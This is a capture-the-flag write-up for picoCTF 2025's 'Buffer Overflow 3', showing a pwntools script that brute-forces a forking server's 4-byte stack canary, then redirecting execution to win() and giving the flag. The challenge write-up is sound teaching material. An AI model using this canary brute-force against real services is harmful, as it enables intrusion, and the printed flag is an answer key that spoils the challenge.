---
title: "Buffer Overflow 3"
pubDate: "2025-03-10"
event: "picoCTF 2025"
author: "0xCat"
score: "300 pts"
tags: ["pwn"]
description: "Bruteforcing a stack canary byte-by-byte and overwriting return address."
---

# Buffer Overflow 3 (Pwn - 300 pts)

## Vulnerability Overview
The binary reads user input into a stack buffer protected by a 4-byte custom stack canary. The program forks for each connection, retaining the exact same stack canary value across iterations.

## Exploit Logic

Because the canary does not change between child processes, we can brute-force each of the 4 canary bytes sequentially:

```python
from pwn import *

def find_canary():
    canary = b""
    for i in range(4):
        for byte in range(256):
            p = remote("saturn.picoctf.org", 50000)
            p.sendlineafter(b"> ", str(32 + i + 1).encode())
            payload = b"A" * 32 + canary + bytes([byte])
            p.sendline(payload)
            res = p.recvall()
            if b"Ok" in res:
                canary += bytes([byte])
                break
    return canary
```

Once the canary is recovered, append the target address of `win()` (`0x08049256`) to redirect execution flow.

Flag: `picoCTF{c4n4ry_brut3f0rc3_l34k_succ3ss}`.
